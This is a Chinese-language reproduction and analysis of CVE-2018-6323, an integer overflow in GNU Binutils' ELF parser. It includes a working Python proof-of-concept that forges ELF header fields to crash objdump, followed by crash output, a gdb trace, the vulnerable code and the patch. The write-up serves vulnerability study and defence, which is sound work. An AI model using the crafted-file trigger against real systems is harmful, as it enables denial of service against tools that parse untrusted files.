[TOC]

# CVE-2018-6323

## 参考

1. [https://www.cvedetails.com/cve/CVE-2018-6323/](https://www.cvedetails.com/cve/CVE-2018-6323/)
2. [https://www.exploit-db.com/exploits/44035](https://www.exploit-db.com/exploits/44035)
3. [https://firmianay.github.io/2018/03/01/binutils_2018-6323.html](https://firmianay.github.io/2018/03/01/binutils_2018-6323.html)
4. [https://zhuanlan.zhihu.com/p/49735267](https://zhuanlan.zhihu.com/p/49735267)

## Vulnerability Details

发行版GNU Binutils 2.29.1中，二进制文件描述符库（BFD，Binary File Descriptor）elfcode.h中的elf_object_p函数存在无符号整数溢出漏洞，原因是没有使用bfd_size_type乘法，使用特定的ELF文件可以允许远程攻击者程序拒绝服务。

触发整体思路：objdump在解析二进制文件头的时候会计算program header所占的大小，我们把他要解析的progran header count构造为一个大数，随后在后面计算时由于没有使用bfd_size_type乘法，导致截断溢出。使得后续函数把其作为参数使用时，找不到指针，抛出异常。

## 复现过程

### 1. 环境要求

``` shell
Linux version 4.15.0-76-generic (buildd@lcy01-amd64-011) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12))
```

### 2. 检查当前的bintuils版本并安装我们所需要的版本

`ld`程序是GNU Binutils项目中的一个程序，通过此可以看出当前机器所自带的是Binutils 2.26.1版本

``` shell
┳━hsu@ubuntu ~   21:34:04
┻━━$ ld -v
GNU ld (GNU Binutils) 2.26.1
```

安装Binutils 2.29.1 版本,`--enable-64-bit-bdf`使得Binutils支持64位

``` shell
┳━hsu@ubuntu ~/Desktop/binutils-2.29.1   21:35:21
┻━━$ ./configure --enable-64-bit-bfd
┳━hsu@ubuntu ~/Desktop/binutils-2.29.1   21:35:49 1 ↵
┻━━$ make && sudo make install
```

安装后的Binutils 2.29.1版本程序放在了`/usr/local/bin`下，随后查看一下默认的binutils各个程序的版本

``` shell
┳━hsu@ubuntu ~/Desktop/binutils-2.29.1   21:38:08
┻━━$ ld -v
GNU ld (GNU Binutils) 2.29.1
```

### 3. 触发脚本

``` python
# Exploit Title: Objdump - Integer Overflow Crash POC
# Date: 12.02.2018
# Exploit Author: r4xis
# Tested Version: 2.26.1
# Vuln Version: <2.29.1
# CVE: cve-2018-6323
# Tested on: Ubuntu 16.04 32-bit 
# Vulnerability Details: 
# https://www.cvedetails.com/cve/CVE-2018-6323/
# https://sourceware.org/bugzilla/show_bug.cgi?id=22746


import os

hello = "#include<stdio.h>\nint main(){printf(\"HelloWorld!\\n\"); return 0;}"
f = open("helloWorld.c", 'w')
f.write(hello)
f.close()

os.system("gcc -c helloWorld.c -o test")
# file test
# test: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped

f = open("test", 'rb+')
f.read(0x2c)
f.write("\xff\xff") # 65535
f.read(0x244-0x2c-2)
f.write("\x00\x00\x00\x20") # 536870912
f.close()
# readelf -h test
# Number of program headers:         65535 (536870912)

os.system("objdump -x test; rm -r helloWorld.c test")
```

``` shell
┳━hsu@ubuntu ~/Desktop   21:40:19
┻━━$ python exp.py
objdump: test: File truncated
*** Error in `objdump': free(): invalid pointer: 0x0852faa8 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x67377)[0xb7db0377]
/lib/i386-linux-gnu/libc.so.6(+0x6d2f7)[0xb7db62f7]
/lib/i386-linux-gnu/libc.so.6(+0x6dc31)[0xb7db6c31]
objdump[0x814feab]
objdump[0x8096c10]
objdump[0x80985fc]
objdump[0x8099257]
objdump[0x8052791]
objdump[0x804c1af]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb7d61637]
objdump[0x804c3ca]
======= Memory map: ========
08048000-08245000 r-xp 00000000 08:01 131682     /usr/local/bin/objdump
08245000-08246000 r--p 001fc000 08:01 131682     /usr/local/bin/objdump
08246000-0824b000 rw-p 001fd000 08:01 131682     /usr/local/bin/objdump
0824b000-08250000 rw-p 00000000 00:00 0
0852e000-0854f000 rw-p 00000000 00:00 0          [heap]
b7a00000-b7a21000 rw-p 00000000 00:00 0
b7a21000-b7b00000 ---p 00000000 00:00 0
b7b15000-b7b31000 r-xp 00000000 08:01 654746     /lib/i386-linux-gnu/libgcc_s.so.1
b7b31000-b7b32000 rw-p 0001b000 08:01 654746     /lib/i386-linux-gnu/libgcc_s.so.1
b7b48000-b7d48000 r--p 00000000 08:01 1055141    /usr/lib/locale/locale-archive
b7d48000-b7d49000 rw-p 00000000 00:00 0
b7d49000-b7ef9000 r-xp 00000000 08:01 654708     /lib/i386-linux-gnu/libc-2.23.so
b7ef9000-b7efb000 r--p 001af000 08:01 654708     /lib/i386-linux-gnu/libc-2.23.so
b7efb000-b7efc000 rw-p 001b1000 08:01 654708     /lib/i386-linux-gnu/libc-2.23.so
b7efc000-b7eff000 rw-p 00000000 00:00 0
b7eff000-b7f02000 r-xp 00000000 08:01 654732     /lib/i386-linux-gnu/libdl-2.23.so
b7f02000-b7f03000 r--p 00002000 08:01 654732     /lib/i386-linux-gnu/libdl-2.23.so
b7f03000-b7f04000 rw-p 00003000 08:01 654732     /lib/i386-linux-gnu/libdl-2.23.so
b7f11000-b7f12000 rw-p 00000000 00:00 0
b7f12000-b7f19000 r--s 00000000 08:01 1052776    /usr/lib/i386-linux-gnu/gconv/gconv-modules.cache
b7f19000-b7f1a000 r--p 00741000 08:01 1055141    /usr/lib/locale/locale-archive
b7f1a000-b7f1b000 rw-p 00000000 00:00 0
b7f1b000-b7f1e000 r--p 00000000 00:00 0          [vvar]
b7f1e000-b7f20000 r-xp 00000000 00:00 0          [vdso]
b7f20000-b7f43000 r-xp 00000000 08:01 654680     /lib/i386-linux-gnu/ld-2.23.so
b7f43000-b7f44000 r--p 00022000 08:01 654680     /lib/i386-linux-gnu/ld-2.23.so
b7f44000-b7f45000 rw-p 00023000 08:01 654680     /lib/i386-linux-gnu/ld-2.23.so
bfab2000-bfad3000 rw-p 00000000 00:00 0          [stack]
Aborted (core dumped)
```

### 4. 分析

我们看一下发生core dumped的test文件，test作为`relocatable`文件，重定位的文件的`Number of program headers`字段，保存的是`segment`信息，而`segment`是为了给加载器提供可执行程序在加载时所需的信息的，而可重定位文件本身并不能直接执行，因此relocatable的文件中的`program header table`应为0，而从以下结果来看此值被赋予了一个较大的值`65535`，已经超出了程序在内存中的范围

``` shell
┳━hsu@ubuntu ~/Desktop   21:42:35
┻━━$ file test
test: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped
┳━hsu@ubuntu ~/Desktop   21:43:14
┻━━$ readelf -h test
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              REL (Relocatable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x0
  Start of program headers:          0 (bytes into file)
  Start of section headers:          552 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           0 (bytes)
  Number of program headers:         65535 (536870912)
  Size of section headers:           40 (bytes)
  Number of section headers:         13
  Section header string table index: 12
readelf: Error: Out of memory reading 536870912 program headers
```

该程序是执行`objdump -x test`是崩溃掉的，而objdump是一个命令行程序，它可以用作反汇编程序，以汇编形式查看可执行文件的各种信息。并且objdump使用BFD库读取目标文件的内容。随后我们对`objdump`程序进行调试（先确定是不是2.29.1版本）。

``` shell
gdb-peda$ r -x test
gdb-peda$ bt
#0  0xb7fd9cf5 in __kernel_vsyscall ()
#1  0xb7e2fea9 in __GI_raise (sig=0x6) at ../sysdeps/unix/sysv/linux/raise.c:54
#2  0xb7e31407 in __GI_abort () at abort.c:89
#3  0xb7e6b37c in __libc_message (do_abort=0x2, fmt=0xb7f63e54 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:175
#4  0xb7e712f7 in malloc_printerr (action=<optimized out>, str=0xb7f60943 "free(): invalid pointer", ptr=<optimized out>, ar_ptr=0xb7fb6780 <main_arena>) at malloc.c:5006
#5  0xb7e71c31 in _int_free (av=0xb7fb6780 <main_arena>, p=<optimized out>, have_lock=0x0) at malloc.c:3867
#6  0x0814feab in objalloc_free (o=0x8250800) at ./objalloc.c:187
#7  0x08096c10 in bfd_hash_table_free (table=0x8250a4c) at hash.c:426
#8  0x080985fc in _bfd_delete_bfd (abfd=abfd@entry=0x8250a08) at opncls.c:125
#9  0x08099257 in bfd_close_all_done (abfd=0x8250a08) at opncls.c:773
#10 0x08052791 in display_file (filename=0xbffff7bd "test", target=<optimized out>, last_file=0x1) at ./objdump.c:3726
#11 0x0804c1af in main (argc=0x3, argv=0xbffff654) at ./objdump.c:4015
#12 0xb7e1c637 in __libc_start_main (main=0x804ba50 <main>, argc=0x3, argv=0xbffff654, init=0x8150fd0 <__libc_csu_init>, fini=0x8151030 <__libc_csu_fini>,
    rtld_fini=0xb7fea880 <_dl_fini>, stack_end=0xbffff64c) at ../csu/libc-start.c:291
#13 0x0804c3ca in _start ()
```

通过回溯栈调用，我们查看一下`binutils-2.29.1/bfd/elfcode.h`中的`elf_object_p`函数中读取program headers的代码逻辑

``` c
  /* Read in the program headers.  */
  if (i_ehdrp->e_phnum == 0)//e_phnum为Program header table entry count
    elf_tdata (abfd)->phdr = NULL;
  else
    {
      Elf_Internal_Phdr *i_phdr;
      unsigned int i;

#ifndef BFD64
      if (i_ehdrp->e_phnum > ((bfd_size_type) -1) / sizeof (*i_phdr))
	goto got_wrong_format_error;
#endif
      amt = i_ehdrp->e_phnum * sizeof (*i_phdr);//Vulnerable，i_phdr是Elf32_Phdr的结构体，此乘法即存储program header所需要的总大小
      elf_tdata (abfd)->phdr = (Elf_Internal_Phdr *) bfd_alloc (abfd, amt);
      if (elf_tdata (abfd)->phdr == NULL)
	goto got_no_match;
      if (bfd_seek (abfd, (file_ptr) i_ehdrp->e_phoff, SEEK_SET) != 0)
	goto got_no_match;
      i_phdr = elf_tdata (abfd)->phdr;
      for (i = 0; i < i_ehdrp->e_phnum; i++, i_phdr++)
	{
	  Elf_External_Phdr x_phdr;

	  if (bfd_bread (&x_phdr, sizeof x_phdr, abfd) != sizeof x_phdr)
	    goto got_no_match;
	  elf_swap_phdr_in (abfd, &x_phdr, i_phdr);
	}
    }
```

由下图可以看出，当前指令`imul eax,eax,0x38`,伪造的数值`0xffff` 大于 0，然后在溢出点乘法运算前，eax 为伪造的数值`0x20000000`：做乘法运算结果eax为0x700000000，产生溢出，高位被截断丢弃

``` c
[----------------------------------registers-----------------------------------]
EAX: 0x20000000 ('')
EBX: 0x8250a08 --> 0x8250810 ("test")
ECX: 0xd ('\r')
EDX: 0x5f ('_')
ESI: 0x8250ac8 --> 0x464c457f
EDI: 0xd ('\r')
EBP: 0x81ca560 --> 0x81c9429 ("elf32-i386")
ESP: 0xbffff370 --> 0xb7fe97eb (<_dl_fixup+11>:	add    esi,0x15815)
EIP: 0x80aeba0 (<bfd_elf32_object_p+1856>:	imul   eax,eax,0x38)
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80aeb90 <bfd_elf32_object_p+1840>:	or     DWORD PTR [ebx+0x28],0x800
   0x80aeb97 <bfd_elf32_object_p+1847>:	jmp    0x80ae613 <bfd_elf32_object_p+435>
   0x80aeb9c <bfd_elf32_object_p+1852>:	lea    esi,[esi+eiz*1+0x0]
=> 0x80aeba0 <bfd_elf32_object_p+1856>:	imul   eax,eax,0x38
   0x80aeba3 <bfd_elf32_object_p+1859>:	sub    esp,0x4
   0x80aeba6 <bfd_elf32_object_p+1862>:	xor    edx,edx
   0x80aeba8 <bfd_elf32_object_p+1864>:	push   edx
   0x80aeba9 <bfd_elf32_object_p+1865>:	push   eax
[------------------------------------stack-------------------------------------]
0000| 0xbffff370 --> 0xb7fe97eb (<_dl_fixup+11>:	add    esi,0x15815)
0004| 0xbffff374 --> 0x8250ac8 --> 0x464c457f
0008| 0xbffff378 --> 0xd ('\r')
0012| 0xbffff37c --> 0x0
0016| 0xbffff380 --> 0x8250a0c --> 0x81ca560 --> 0x81c9429 ("elf32-i386")
0020| 0xbffff384 --> 0x82482a0 --> 0x9 ('\t')
0024| 0xbffff388 --> 0x8250a08 --> 0x8250810 ("test")
0028| 0xbffff38c --> 0x81ca560 --> 0x81c9429 ("elf32-i386")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bfd_elf32_object_p (abfd=0x8250a08) at elfcode.h:780
780	      elf_tdata (abfd)->phdr = (Elf_Internal_Phdr *) bfd_alloc (abfd, amt);
```

截断后高位的 `0x7` 被丢弃， eax 为 `0x00000000`，且 OVERFLOW 的标志位被设置,如下：

``` c
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x8250a08 --> 0x8250810 ("test")
ECX: 0xd ('\r')
EDX: 0x5f ('_')
ESI: 0x8250ac8 --> 0x464c457f
EDI: 0xd ('\r')
EBP: 0x81ca560 --> 0x81c9429 ("elf32-i386")
ESP: 0xbffff370 --> 0xb7fe97eb (<_dl_fixup+11>:	add    esi,0x15815)
EIP: 0x80aeba3 (<bfd_elf32_object_p+1859>:	sub    esp,0x4)
EFLAGS: 0xa07 (CARRY PARITY adjust zero sign trap INTERRUPT direction OVERFLOW)
[-------------------------------------code-------------------------------------]
   0x80aeb97 <bfd_elf32_object_p+1847>:	jmp    0x80ae613 <bfd_elf32_object_p+435>
   0x80aeb9c <bfd_elf32_object_p+1852>:	lea    esi,[esi+eiz*1+0x0]
   0x80aeba0 <bfd_elf32_object_p+1856>:	imul   eax,eax,0x38
=> 0x80aeba3 <bfd_elf32_object_p+1859>:	sub    esp,0x4
   0x80aeba6 <bfd_elf32_object_p+1862>:	xor    edx,edx
   0x80aeba8 <bfd_elf32_object_p+1864>:	push   edx
   0x80aeba9 <bfd_elf32_object_p+1865>:	push   eax
   0x80aebaa <bfd_elf32_object_p+1866>:	push   ebx
[------------------------------------stack-------------------------------------]
0000| 0xbffff370 --> 0xb7fe97eb (<_dl_fixup+11>:	add    esi,0x15815)
0004| 0xbffff374 --> 0x8250ac8 --> 0x464c457f
0008| 0xbffff378 --> 0xd ('\r')
0012| 0xbffff37c --> 0x0
0016| 0xbffff380 --> 0x8250a0c --> 0x81ca560 --> 0x81c9429 ("elf32-i386")
0020| 0xbffff384 --> 0x82482a0 --> 0x9 ('\t')
0024| 0xbffff388 --> 0x8250a08 --> 0x8250810 ("test")
0028| 0xbffff38c --> 0x81ca560 --> 0x81c9429 ("elf32-i386")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080aeba3	780	      elf_tdata (abfd)->phdr = (Elf_Internal_Phdr *) bfd_alloc (abfd, amt);
```

随后`eax=0`作为第二个参数传入`bfd_alloc()`函数，由如下定义可看出参数为0时，分配不成功

``` c
/*
FUNCTION
	bfd_alloc

SYNOPSIS
	void *bfd_alloc (bfd *abfd, bfd_size_type wanted);

DESCRIPTION
	Allocate a block of @var{wanted} bytes of memory attached to
	<<abfd>> and return a pointer to it.
*/
```

而在后续中，`objalloc_free()`又对这个分配的内存进行释放，由于这是个不存在的地址，于是抛出了异常。

### 5. 补丁

在binutils-2.30中，补丁将原本为`i_ehdrp->e_phnum`转化为了`unsigned long bfd_size_type`

``` c
...
-      amt = sizeof (*i_shdrp) * i_ehdrp->e_shnum;
+      amt = sizeof (*i_shdrp) * (bfd_size_type) i_ehdrp->e_shnum;
...
-      amt = i_ehdrp->e_phnum * sizeof (*i_phdr);
+      amt = (bfd_size_type) i_ehdrp->e_phnum * sizeof (*i_phdr);
...
```

